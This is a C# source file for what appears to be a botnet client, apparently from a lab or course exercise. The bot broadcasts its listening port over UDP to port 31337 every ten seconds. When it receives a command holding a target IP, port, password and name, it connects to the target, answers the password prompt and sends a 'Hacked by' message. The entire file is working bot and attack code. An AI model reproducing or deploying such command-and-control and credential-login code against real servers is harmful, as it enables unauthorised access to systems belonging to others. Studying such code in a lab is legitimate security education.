using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
namespace BotClients
{
	public class Program
	{
		static int port_ = FreeTcpPort();
		static UdpClient client = new UdpClient(port_);
		static IPEndPoint ep = new IPEndPoint(IPAddress.Broadcast, port_); // endpoint where server is listening

		private static string GetLocalIPAddress()
		{
			IPHostEntry host = Dns.GetHostEntry(Dns.GetHostName());
			foreach (IPAddress ip in host.AddressList)
			{
				if (ip.AddressFamily == AddressFamily.InterNetwork)
				{
					return ip.ToString();
				}
			}
			throw new Exception("No network adapters with an IPv4 address in the system!");
		}

		public static void Main(string[] args)
		{
			///int port2 = ((IPEndPoint)client.Client.LocalEndPoint).Port;
			Console.WriteLine("Bot is listening on port " + port_);
			Thread listenThread = new Thread(() =>
			{
				//try
				//{
				while (true)
				{
					byte[] receivedData = client.Receive(ref ep);
					byte[] ip_to_attack = new byte[4];
					byte[] port_to_attack = new byte[2];
					byte[] pass_to_attack = new byte[6];
					byte[] name_of_server = new byte[32];
                    for (int i = 0, j = 0; i < 4; i++)
						ip_to_attack[j++] = receivedData[i];
					for (int i = 4, j = 0; i < 6; i++)
                        port_to_attack[j++] = receivedData[i];
					for (int i = 6, j = 0; i < 12; i++)
                        pass_to_attack[j++] = receivedData[i];
					for (int i = 12, j = 0; i < 44; i++)
                        name_of_server[j++] = receivedData[i];
					Attack(ip_to_attack, port_to_attack, pass_to_attack, name_of_server);

					//}
					//catch (Exception e)
					//{
					//	Console.WriteLine("exp " + e.Message);
					//}
				}
			});
			listenThread.Start();
			//Console.Write("receive data from " + ep.ToString());
			while (true)
			{
				byte[] int_bytes = BitConverter.GetBytes((Int16)port_);
				client.Send(int_bytes, int_bytes.Length, new IPEndPoint(IPAddress.Broadcast, 31337));
				Thread.Sleep(10000);//sent again any 10 sec
			}
		}

		public static void Attack(byte[] ip_to_attack, byte[] port_to_attack, byte[] pass_to_attack, byte[] name_of_server)
		{

			while (true)
			{
				TcpClient s = new TcpClient(new IPAddress(ip_to_attack).ToString(), BitConverter.ToUInt16(port_to_attack, 0));
				IPAddress[] ipnew = Dns.GetHostAddresses(Dns.GetHostName());
				//IPEndPoint ipEnd = new IPEndPoint(ipnew[1], BitConverter.ToUInt16(port_to_attack, 0));
				NetworkStream ns = s.GetStream(); //networkstream is used to send/receive messages
				byte[] buffer = new byte[256];
				try {
					ns.Read(buffer, 0, buffer.Length);
					string message = Encoding.Default.GetString(buffer);
					//Console.Write("got from victim: " + message);
					if (message.Contains("Please enter password"))
					{
						byte[] toSend = Encoding.Default.GetBytes(Encoding.Default.GetString(pass_to_attack) + "\r\n");
						ns.Write(toSend, 0, toSend.Length);
						//Console.Write("sent from victim: " + Encoding.Default.GetString(pass_to_attack) + "\r\n");
					}
					ns.Read(buffer, 0, buffer.Length);
					string message1 = Encoding.Default.GetString(buffer);
					//Console.Write("got from victim: " + message1);
					if (message1.Contains("Access granted"))
					{
						byte[] toSend = Encoding.Default.GetBytes("Hacked by " + Encoding.Default.GetString(name_of_server) + "\r\n");
						ns.Write(toSend, 0, toSend.Length);
						//Console.Write("sent from victim: " + "Hacked by " + Encoding.Default.GetString(name_of_server) + "\r\n");
					}
				}
				catch (Exception)
				{
					Console.WriteLine("problem with victim con");
				}
			
				s.Close();
				ns.Close();
				break;
			}
		}

		static int FreeTcpPort()
		{
			TcpListener l = new TcpListener(IPAddress.Loopback, 0);
			l.Start();
			int port = ((IPEndPoint)l.LocalEndpoint).Port;
			l.Stop();
			return port;
		}
	}
}